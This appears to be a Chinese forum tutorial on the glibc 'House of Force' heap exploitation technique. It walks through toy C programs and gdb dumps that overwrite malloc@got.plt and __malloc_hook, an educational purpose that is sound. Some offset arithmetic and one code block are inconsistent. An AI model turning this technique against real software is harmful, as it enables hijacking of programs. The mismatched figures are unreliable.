
[347K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0r3j5%4c8X3i4K6u0V1N6$3W2C8K9b7`.`.](https://bbs.kanxue.com/elink@1bfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0r3j5%4c8X3i4K6u0V1N6$3W2C8K9b7`.`.)

## 介绍

House Of Force属于House Of XXX系列，House Of XXX指的是2004年一篇名为《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》的文章中提出的一系列针对`glibc`漏洞的利用方法。

但是由于年代久远《The Malloc Maleficarum》中提出的大多数利用在今天都不能奏效，我们现在所指的House Of XXX利用相比2004年文章中写的已有较大的不同。但是《The Malloc Maleficarum》依然是一篇推荐阅读的文章，你可以在这里读到它的原文：

[d47K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8q4)9J5k6i4m8S2j5$3E0W2N6s2y4@1L8%4u0E0M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2F1k6i4c8Q4x3V1k6H3j5i4m8W2M7Y4y4Q4x3V1k6S2N6s2c8S2j5$3E0Q4x3V1k6y4j5h3I4D9L8$3y4y4j5h3I4W2k6X3W2U0j5i4u0#2L8g2)9J5k6i4c8^5N6l9`.`.](https://bbs.kanxue.com/elink@dafK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8q4)9J5k6i4m8S2j5$3E0W2N6s2y4@1L8%4u0E0M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2F1k6i4c8Q4x3V1k6H3j5i4m8W2M7Y4y4Q4x3V1k6S2N6s2c8S2j5$3E0Q4x3V1k6y4j5h3I4D9L8$3y4y4j5h3I4W2k6X3W2U0j5i4u0#2L8g2)9J5k6i4c8^5N6l9`.`.)

## 原理

House Of Force是一种堆溢出的利用方法，当然能够通过House Of Force进行利用的可能不只是堆溢出漏洞。如果一个堆(`heap based`)漏洞想要通过House Of Force方法进行利用，需要以下条件：

- 1.用户能够以溢出等方式控制到`top chunk`的`size`域
- 2.用户能够自由的控制堆分配尺寸的大小

House Of Force产生的原因在于`glibc`对`top chunk`的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时会从`top chunk`中分割出相应的大小作为堆块的空间，因此`top chunk`的位置会发生上下浮动以适应堆内存分配和释放。

`HOF`的利用思想可以概括为一句话：

当使用`top chunk`分配堆块的`size`值是由用户控制的任意值时会发生什么？

答案是，可以使得`top chunk`移动到我们想要达到的任何位置，这就相当于一次任意地址写。

然而在`glibc`中，会对用户请求的大小和`top chunk`现有的`size`进行验证

```c
// 获取当前的top chunk，并计算其对应的大小

victim = av->top;

size   = chunksize(victim);

// 如果在分割之后，其大小仍然满足chunk的最小大小，那么就可以直接进行分割。

if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

然而，如果可以篡改`size`的大小为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制`top chunk` `size`域的漏洞。

```c
(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
```

一般的做法是把`top chunk`的`size`改为-1，因为在进行比较时会把`size`转换成无符号数(如上)，因此-1会解释成为一个大数，就可以使得所有64位值都能通过验证。

```c
remainder      = chunk_at_offset(victim, nb);
av->top        = remainder;

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
```

之后这里会把`top`指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意址(write-anything-anywhere)。

## 简单示例1

在学习完`HOF`的原理之后，我们这里通过一个示例来说明`HOF`的利用

这个例子的目标是通过`HOF`来篡改`malloc@got.plt`实现劫持程序流程

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
}
```

首先，我们分配一个`0x10`字节大小的块

```
0x602000:    0x0000000000000000    0x0000000000000021 <=== ptr
0x602010:    0x0000000000000000    0x0000000000000000
0x602020:    0x0000000000000000    0x0000000000020fe1 <=== top chunk
0x602030:    0x0000000000000000    0x0000000000000000
```

之后把`top chunk`的`size`改为`0xffffffffffffffff`，在题目中这一步可以通过堆溢出等漏洞来实现。

因为-1在补码中是以`0xffffffffffffffff`表示的，所以我们直接赋值-1就可以。

```
0x602000:    0x0000000000000000    0x0000000000000021 <=== ptr
0x602010:    0x0000000000000000    0x0000000000000000
0x602020:    0x0000000000000000    0xffffffffffffffff <=== top chunk size域被更改
0x602030:    0x0000000000000000    0x0000000000000000
```

注意此时的`top chunk`位置，当我们进行下一次分配的时候就会更改`top chunk`的位置到我们想要的地方

```
0x7ffff7dd1b20 <main_arena>:    0x0000000100000000    0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:    0x0000000000000000    0x0000000000602020 <=== top chunk此时一切正常
0x7ffff7dd1b80 <main_arena+96>:    0x0000000000000000    0x00007ffff7dd1b78
```

接下来我们执行`malloc(-4120);`，-4120是怎么得出的呢？

首先明确要写入的目的地址，这里我编译的情况`0x601020`是`malloc@got.plt`的地址

```
0x601020:    0x00007ffff7a91130 <=== malloc@got.plt
```

之后明确当前`top chunk`的地址，根据前面描述，`top chunk`位于`0x602020`

所以我们使用`0x601020-0x602020-0x10=-4120`,之所以要减去`0x10`是为了刨除`chunk` header的偏移

当调用`malloc(-4120)`之后，我们可以观察到`top chunk`被抬高到我们想要的位置

```
0x7ffff7dd1b20 <main_arena>:\    0x0000000100000000    0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:    0x0000000000000000    0x0000000000601010 <=== 可以观察到top chunk被抬高
0x7ffff7dd1b80 <main_arena+96>:    0x0000000000000000    0x00007ffff7dd1b78
```

之后，我们分配的块就会出现在`0x601010+0x10`的位置，也就是`0x601020`可以更改`got`表中的内容了。

## 简单示例2

在上一个示例中我们演示了通过`HOF`使得`top chunk`的指针减小来修改位于其上面(低地址)的`got`表中的内容，

但是`HOF`其实也可以使得`top chunk`指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指针
    malloc(0x10);
}
```

我们可以看到程序代码与简单示例1基本相同，除了第二次`malloc`的`size`有所不同。

这次我们的目标是`malloc_hook`，我们知道`malloc_hook`是位于`libc.so`里的全局变量值，首先查看内存布局

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

可以看到`heap`的基址在`0x602000`，而`libc`的基址在`0x7ffff7a0d000`，因此我们需要通过`HOF`扩大`top chunk`指针的值来实现对`malloc_hook`的写。

首先由调试得知`__malloc_hook`的地址位于`0x7ffff7dd1b10`，采取计算`0x7ffff7dd1b00-0x602020-0x10=140737345551056`

经过这次`malloc`之后，我们可以观察到`top chunk`的地址被抬高到了`0x00007ffff7dd1b00`
